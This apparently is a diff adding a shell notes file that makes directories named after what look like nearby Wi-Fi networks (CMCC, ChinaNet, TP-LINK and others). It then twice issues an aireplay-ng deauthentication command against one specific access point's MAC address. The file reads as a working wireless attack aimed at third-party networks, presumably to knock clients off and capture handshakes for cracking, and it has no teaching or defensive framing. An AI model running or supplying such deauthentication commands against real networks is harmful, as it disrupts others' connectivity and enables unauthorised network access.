@@ -1,0 +1,20 @@
+mkdir DIRECT-REDESKTOP-S685CSNmsUZ
+mkdir CMCC
+mkdir FAST_1790
+mkdir 5楼
+mkdir xiaoxinshuadaxiang
+mkdir ChinaNet-V2QS
+mkdir TP-LINK_E42E
+mkdir CMCC-7aLa
+mkdir CMCC-1234
+mkdir CMCC-j5DF
+mkdir HUAWEI-wxk
+mkdir acfun
+mkdir Tenda_CE25C0
+mkdir 常来常往
+mkdir ChinaNet-MDux
+
+
+
+aireplay-ng -0 5 -a 68:FE:DA:0A:39:3D wlan0mon
+aireplay-ng -0 5 -a 68:FE:DA:0A:39:3D wlan0mon
